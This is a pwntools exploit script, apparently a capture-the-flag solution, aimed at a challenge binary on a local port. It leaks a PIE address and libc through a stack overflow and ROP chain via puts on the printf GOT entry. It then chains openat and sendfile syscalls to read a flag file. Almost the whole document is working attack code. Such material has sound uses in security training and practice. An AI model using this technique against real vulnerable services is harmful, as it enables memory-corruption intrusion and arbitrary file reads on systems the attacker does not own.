#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template a.out
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/chal')
libc = ELF('/challenge/libc.so.6')
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

#io = start()
io = remote('127.0.0.1', 1337)

# STEP 1: read in main address for PIE
io.sendline(b"Melvin\x00")
io.recvuntil(b"<|;)\n")
main_addr = io.recvline()[:-1]
main_addr = int(main_addr,16)
log.info("Received main addr: " + hex(main_addr))
log.info("Binary main addrL: "+ hex(exe.sym.main))
exe.address = main_addr - exe.sym['main']
log.success("new calculated exe addr: " + hex(exe.address))
log.success("calculated main: " +hex(exe.sym['main']))


padding = 280*b'A'

#STEP 2: leak libc
rop = ROP([exe,libc])
puts_plt = exe.plt['puts']
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi','ret'])[0]
if pop_rsi < 0:
    pop_rsi = rop.find_gadget(['pop rdi','ret'])[1]
pop_rdx = rop.find_gadget(['pop rdx','ret'])[0]
pop_rax = rop.find_gadget(['pop rax','ret'])[0]
syscall = rop.find_gadget(['syscall','ret'])[0]
ret = rop.find_gadget(['ret'])[0]
func = exe.got['printf']
log.info("printf GOT @ "+hex(func))


rop1 = padding + p64(pop_rdi) + p64(func) + p64(puts_plt) + p64(main_addr)
io.sendline(rop1)

leak = io.recvline()[:-1]
leak = int.from_bytes(leak,'little')
print(hex(leak))

libc.address = leak - libc.sym['printf']
# STEP 3: use syscalls
rop = ROP([exe,libc])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi','ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx','ret'])[0]
pop_rax = rop.find_gadget(['pop rax','ret'])[0]
syscall = rop.find_gadget(['syscall','ret'])[0]
log.info("pop rdi @ "+hex(pop_rdi))
log.info("pop rsi @ "+hex(pop_rsi))
log.info("pop rdx @ "+hex(pop_rdx))
log.info("pop rax @ "+hex(pop_rax))

name_addr = exe.address + 0x00004050
# call 
payload = p64(pop_rdi) + p64(0) 
payload += p64(pop_rsi) + p64(name_addr)
payload += p64(pop_rdx) + p64(0)
payload += p64(pop_rax) + p64(257) #openat
payload += p64(syscall)


rop.sendfile(1,3,0,0x64)



io.sendline(b'/home/user/flag.txt\x00')

io.sendline(padding + payload + rop.chain())

result = str(io.recvall().decode('ascii'))
if 'wctf{' in result:
    print(result)
    exit(0)
print(result)
exit(1)

